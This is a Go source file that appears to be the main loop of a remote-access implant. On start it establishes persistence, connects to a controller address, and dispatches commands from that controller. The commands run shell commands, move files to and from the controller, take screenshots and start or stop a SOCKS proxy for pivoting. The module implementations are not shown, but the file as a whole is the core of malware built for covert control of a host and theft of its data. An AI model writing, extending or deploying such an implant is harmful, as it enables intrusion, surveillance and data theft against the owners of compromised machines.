package main

import (
	"agent/config"
	"agent/controller"
	"agent/modules"
	pb "agent/protos/cmds"
	"log"

	"google.golang.org/protobuf/proto"
)

func main() {
	err := modules.EnsurePersistence()
	if err != nil {
		log.Fatalf("failed to persist: %v", err)
	}
	controller := controller.Controller{Addr: config.Conf.ControllerAddress}
	controller.Connect()
	for {
		cmdReq, err := controller.ReadCommandRequest()
		if err != nil {
			log.Printf("failed to read command: %v", err)
			continue
		}
		var resp proto.Message
		switch cmdReq.GetReq().(type) {
		case *pb.CommandRequest_EchoCommandRequest:
			resp = modules.RunEchoCommand(cmdReq.GetEchoCommandRequest())
		case *pb.CommandRequest_ShellCommandRequest:
			resp = modules.RunShellCommand(cmdReq.GetShellCommandRequest())
		case *pb.CommandRequest_UploadFileRequest:
			resp = modules.DownloadFileFromController(cmdReq.GetUploadFileRequest())
		case *pb.CommandRequest_DownloadFileRequest:
			resp = modules.UploadFileToController(cmdReq.GetDownloadFileRequest())
		case *pb.CommandRequest_ScreenshotRequest:
			resp = modules.Screenshot(cmdReq.GetScreenshotRequest())
		case *pb.CommandRequest_StartSocksServerRequest:
			resp = modules.StartSocksServer(cmdReq.GetStartSocksServerRequest(), controller.Session)
		case *pb.CommandRequest_StopSocksServerRequest:
			resp = modules.StopSocksServer(cmdReq.GetStopSocksServerRequest(), controller.Session)
		default:
			log.Printf("unknown command request: %v", cmdReq)
			continue
		}
		err = controller.WriteCommandResponse(resp)
		if err != nil {
			log.Printf("failed to write command response: %v", err)
		}
	}
}
